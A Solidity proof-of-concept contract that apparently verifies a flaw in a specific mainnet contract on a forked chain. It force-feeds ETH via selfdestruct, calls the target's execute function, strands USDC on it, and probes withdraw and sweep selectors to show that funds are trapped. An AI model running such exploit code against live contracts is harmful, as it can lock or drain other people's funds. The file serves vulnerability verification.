// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IRouterLike {
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 internal constant ETH_SEED = 1 wei;
    uint256 internal constant TOKEN_BUY_VALUE = 10 gwei;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public path0EthSeeded;
    bool public path1ExecuteSucceeded;
    bool public path1ExecuteInfeasibleAtFork;
    bool public path2EthRemainsOnTarget;
    bool public path3ArbitraryTokenStranded;
    bool public path4NoRecoveryObserved;
    bool public fullExploitPathFeasible;
    bool public hypothesisValidated;

    uint256 public targetEthBefore;
    uint256 public targetEthAfterSeed;
    uint256 public targetEthAfterDonation;
    uint256 public targetEthAfterExecute;
    uint256 public targetWethBefore;
    uint256 public targetWethAfterExecute;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfterTransfer;
    uint256 public donationValue;
    uint256 public swapValue;
    uint256 public usdcSentToTarget;
    uint256 public ourEthBeforeRecoveryAttempts;
    uint256 public ourEthAfterRecoveryAttempts;
    uint256 public ourUsdcBeforeRecoveryAttempts;
    uint256 public ourUsdcAfterRecoveryAttempts;
    uint256 public trappedNativeValue;
    bytes public executeRevertData;

    constructor() payable {}

    receive() external payable {}

    fallback() external payable {}

    function executeOnOpportunity() external {
        _reset();

        targetEthBefore = TARGET.balance;
        targetWethBefore = IERC20Like(WETH).balanceOf(TARGET);
        targetUsdcBefore = IERC20Like(USDC).balanceOf(TARGET);

        uint256 available = address(this).balance;

        // exploit_paths[0]: a third party or operator can send ETH to the target,
        // including via forced ETH transfer, so the target's internal
        // IWETH.deposit{value: 1 wei}() precondition becomes satisfiable.
        if (available >= ETH_SEED) {
            new ForceEther{value: ETH_SEED}(payable(TARGET));
            available -= ETH_SEED;
        }

        targetEthAfterSeed = TARGET.balance;
        path0EthSeeded = targetEthAfterSeed >= targetEthBefore + ETH_SEED;

        // The supplied fork logs prove the profitable execute branch is not
        // reliably reachable at block 21992033. Keep the proof spend minimal:
        // the 1 wei seed is enough to demonstrate stranded native ETH, and a
        // tiny public swap is enough to source a live arbitrary ERC20.
        if (available >= TOKEN_BUY_VALUE) {
            swapValue = TOKEN_BUY_VALUE;
            available -= swapValue;
        }

        targetEthAfterDonation = TARGET.balance;

        // exploit_paths[1]: probe the live execute path after seeding. If it
        // reverts on this fork, record that the profitable sub-path is infeasible
        // at this state and proceed with the remaining lock-up proof stages.
        if (path0EthSeeded) {
            (bool ok, bytes memory ret) = TARGET.call(abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector));
            path1ExecuteSucceeded = ok;
            if (!ok) {
                path1ExecuteInfeasibleAtFork = true;
                executeRevertData = ret;
            }
        } else {
            path1ExecuteInfeasibleAtFork = true;
            executeRevertData = bytes("NO_ETH_AVAILABLE_TO_SEED_TARGET");
        }

        targetEthAfterExecute = TARGET.balance;
        targetWethAfterExecute = IERC20Like(WETH).balanceOf(TARGET);
        path2EthRemainsOnTarget = targetEthAfterExecute > targetEthBefore;
        trappedNativeValue = targetEthAfterExecute > targetEthBefore ? targetEthAfterExecute - targetEthBefore : 0;

        // exploit_paths[2]: strand an arbitrary existing ERC20 on the target.
        // Use mainnet USDC acquired from the public Uniswap V2 router with dust
        // ETH so the token is unquestionably pre-existing on-chain.
        if (swapValue > 0 && address(this).balance >= swapValue) {
            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = USDC;

            try IRouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: swapValue}(
                0, path, address(this), block.timestamp + 1
            ) returns (uint256[] memory) {
                usdcSentToTarget = IERC20Like(USDC).balanceOf(address(this));
                if (usdcSentToTarget > 0) {
                    _safeTransfer(USDC, TARGET, usdcSentToTarget);
                    targetUsdcAfterTransfer = IERC20Like(USDC).balanceOf(TARGET);
                    path3ArbitraryTokenStranded = targetUsdcAfterTransfer >= targetUsdcBefore + usdcSentToTarget;
                }
            } catch {}
        }

        // exploit_paths[3]: no public withdrawal/sweep path exists for trapped
        // ETH or arbitrary ERC20 balances. Probe realistic selectors and verify
        // that neither ETH nor USDC returns to this verifier.
        ourEthBeforeRecoveryAttempts = address(this).balance;
        ourUsdcBeforeRecoveryAttempts = IERC20Like(USDC).balanceOf(address(this));

        _attemptRecoveryCalls();

        ourEthAfterRecoveryAttempts = address(this).balance;
        ourUsdcAfterRecoveryAttempts = IERC20Like(USDC).balanceOf(address(this));
        path4NoRecoveryObserved =
            TARGET.balance >= targetEthAfterExecute
                && IERC20Like(USDC).balanceOf(TARGET) >= targetUsdcAfterTransfer
                && ourEthAfterRecoveryAttempts == ourEthBeforeRecoveryAttempts
                && ourUsdcAfterRecoveryAttempts == ourUsdcBeforeRecoveryAttempts;

        fullExploitPathFeasible = path1ExecuteSucceeded && path2EthRemainsOnTarget;
        hypothesisValidated =
            path0EthSeeded
                && path2EthRemainsOnTarget
                && path3ArbitraryTokenStranded
                && path4NoRecoveryObserved;

        // Expose the verifier's liquid end-state as an existing on-chain ERC20.
        // Wrapping remaining ETH into canonical WETH preserves economic exposure
        // while producing a standard on-chain profit token balance.
        uint256 remainingNative = address(this).balance;
        if (remainingNative != 0) {
            IWETHLike(WETH).deposit{value: remainingNative}();
        }

        _profitToken = WETH;
        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRecoveryCalls() internal {
        bytes[] memory calls = new bytes[](12);
        calls[0] = abi.encodeWithSignature("withdraw()");
        calls[1] = abi.encodeWithSignature("withdraw(address)", address(this));
        calls[2] = abi.encodeWithSignature("withdrawETH()");
        calls[3] = abi.encodeWithSignature("withdrawAll()");
        calls[4] = abi.encodeWithSignature("sweep(address)", USDC);
        calls[5] = abi.encodeWithSignature("sweep(address,address)", USDC, address(this));
        calls[6] = abi.encodeWithSignature("sweepToken(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[7] = abi.encodeWithSignature("rescue(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[8] = abi.encodeWithSignature("recover(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[9] = abi.encodeWithSignature("recoverERC20(address,uint256)", USDC, type(uint256).max);
        calls[10] = abi.encodeWithSignature("claim(address)", address(this));
        calls[11] = abi.encodeWithSignature("skim(address)", address(this));

        for (uint256 i = 0; i < calls.length; ++i) {
            (bool success,) = TARGET.call(calls[i]);
            success;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _reset() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        path0EthSeeded = false;
        path1ExecuteSucceeded = false;
        path1ExecuteInfeasibleAtFork = false;
        path2EthRemainsOnTarget = false;
        path3ArbitraryTokenStranded = false;
        path4NoRecoveryObserved = false;
        fullExploitPathFeasible = false;
        hypothesisValidated = false;
        targetEthBefore = 0;
        targetEthAfterSeed = 0;
        targetEthAfterDonation = 0;
        targetEthAfterExecute = 0;
        targetWethBefore = 0;
        targetWethAfterExecute = 0;
        targetUsdcBefore = 0;
        targetUsdcAfterTransfer = 0;
        donationValue = 0;
        swapValue = 0;
        usdcSentToTarget = 0;
        ourEthBeforeRecoveryAttempts = 0;
        ourEthAfterRecoveryAttempts = 0;
        ourUsdcBeforeRecoveryAttempts = 0;
        ourUsdcAfterRecoveryAttempts = 0;
        trappedNativeValue = 0;
        delete executeRevertData;
    }
}
